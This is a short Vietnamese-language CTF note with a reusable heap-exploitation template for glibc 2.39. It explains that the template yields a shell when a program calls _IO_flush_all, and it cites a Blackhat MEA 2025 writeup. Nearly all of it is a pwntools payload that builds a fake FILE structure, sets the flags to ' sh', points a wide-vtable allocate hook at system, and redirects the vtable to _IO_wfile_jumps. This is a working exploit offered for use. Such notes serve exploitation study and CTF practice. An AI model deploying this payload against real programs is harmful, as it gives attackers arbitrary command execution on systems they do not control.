<details>
<summary> <strong> Description </strong></summary>
<p>

Template này sẽ get shell nếu chương trình gọi đến `_IO_flush_all`. 

</p>
</details>

<!--  -->

<details>
<summary><strong>POC</strong></summary>
<p>

Kĩ thuật này được dùng cho glibc `2.39`.

```python
payload = flat(
    {
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # basic approach with spaces:
        # " sh\x00"
        # 0x20, 0x73, 0x68, 0x00
        0x00: b" sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x18: p64(0),
        # fake_file->file._IO_write_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_IO_buf_base
        0x30: p64(0),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x68: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc.symbols["_IO_stdfile_0_lock"],
        # fake_file->file._wide_data
        0xA0: fake_file,
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"],
        # fake_file->file._wide_data->_wide_vtable
        0xE0: fake_file,
    }
)
```

</p>
</details>


<!--  -->

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://jia.je/ctf-writeups/2025-09-07-blackhat-mea-ctf-quals-2025/file101.html

</p>
</details>